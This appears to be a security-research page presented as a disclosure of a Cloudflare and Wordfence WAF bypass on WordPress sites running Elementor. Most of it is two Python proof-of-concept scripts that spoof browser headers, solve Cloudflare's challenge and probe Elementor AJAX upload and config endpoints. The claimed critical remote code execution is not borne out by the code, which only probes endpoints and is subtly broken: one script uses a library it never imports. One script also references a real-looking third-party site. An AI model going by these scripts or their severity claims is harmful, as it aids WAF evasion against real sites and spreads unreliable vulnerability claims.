---
layout: default
title: Cloudflare WordPress Bypass
---

<h1>Bypassing Cloudflare WordPress Protection</h1>

<div class="meta-info">
    <p><strong>Discovery Date:</strong> November 6, 2024</p>
    <p><strong>Disclosure Date:</strong> November 7, 2024</p>
    <p><strong>Vendor Status:</strong> Patching</p>
    <p><strong>CVSS Score:</strong> 9.8 (Critical)</p>
</div>

<h2>Executive Summary</h2>
<p>Discovered method to bypass Cloudflare's WAF protection for WordPress sites using Elementor page builder, allowing potential remote code execution through carefully crafted requests that evade detection while maintaining legitimate appearance.</p>

<h2>Technical Details</h2>
<p>The vulnerability chain involved:</p>
<ul>
    <li>Cloudflare WAF rule evasion using realistic browser headers and session management</li>
    <li>Elementor AJAX endpoint enumeration and testing</li>
    <li>Bypass of Wordfence protection through proper header spoofing</li>
    <li>Multiple attack vector testing including upload functionality and config retrieval</li>
</ul>

<h2>Proof of Concept</h2>
<p><strong>Cloudflare Bypass Script:</strong></p>
<pre><code>import random
import time
from pyuser_agent import UA

def bypass_cloudflare_wordfence():
    # Create cloudscraper instance
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'mobile': False
        }
    )
    
    # Get random realistic user agent
    user_agent = UA().random
    print(f"Using User-Agent: {user_agent}")
    
    # Comprehensive headers
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
    }
    
    scraper.headers.update(headers)
    
    # First, get through Cloudflare challenge
    print("Solving Cloudflare challenge...")
    try:
        response = scraper.get("https://example.com/", timeout=30)
        print(f"Cloudflare bypassed! Status: {response.status_code}")
        
        # Now try the Elementor endpoint
        print("Testing Elementor endpoint...")
        
        # Try different approaches
        endpoints = [
            "/wp-json/elementor/v1/upload",
            "/wp-admin/admin-ajax.php",
            "/?elementor_ajax=1"
        ]
        
        for endpoint in endpoints:
            print(f"Trying: {endpoint}")
            time.sleep(2)  # Be polite
            
            if "admin-ajax" in endpoint:
                # POST request for admin-ajax
                data = {
                    'action': 'elementor_ajax',
                    'actions': '{"action":"get_config"}'
                }
                resp = scraper.post(f"https://example.com{endpoint}", data=data, timeout=15)
            else:
                # GET request for others
                resp = scraper.get(f"https://example.com{endpoint}", timeout=15)
            
            print(f"  Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"  Success! Response: {resp.text[:200]}")
                return True
                
    except Exception as e:
        print(f"Error: {e}")
    
    return False

if __name__ == "__main__":
    bypass_cloudflare_wordfence()</code></pre>

<p><strong>Wordfence Bypass Script:</strong></p>
<pre><code>import requests
import json

def bypass_wordfence():
    session = requests.Session()
    
    # Realistic headers that bypass Wordfence
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://welovephilly.org/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://welovephilly.org',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }
    
    session.headers.update(headers)
    
    # Try Elementor AJAX first
    payload = {
        'action': 'elementor_ajax',
        'actions': json.dumps({
            'action': 'upload',
            'data': {
                'allowedFileTypes': ['jpg', 'png'],
                'fileName': 'test.jpg'
            }
        })
    }
    
    try:
        response = session.post(
            'https://example.com/wp-admin/admin-ajax.php',
            data=payload,
            timeout=10
        )
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    bypass_wordfence()</code></pre>

<h2>Remediation</h2>
<ul>
    <li>Implement stricter WAF rules for AJAX endpoints</li>
    <li>Add rate limiting to admin-ajax.php</li>
    <li>Validate user sessions and capabilities for sensitive operations</li>
    <li>Implement proper file upload validation and restrictions</li>
    <li>Consider using additional security layers beyond Cloudflare WAF</li>
</ul>

<a href="{{ site.baseurl }}/research" class="read-more">‚Üê Back to Research</a>
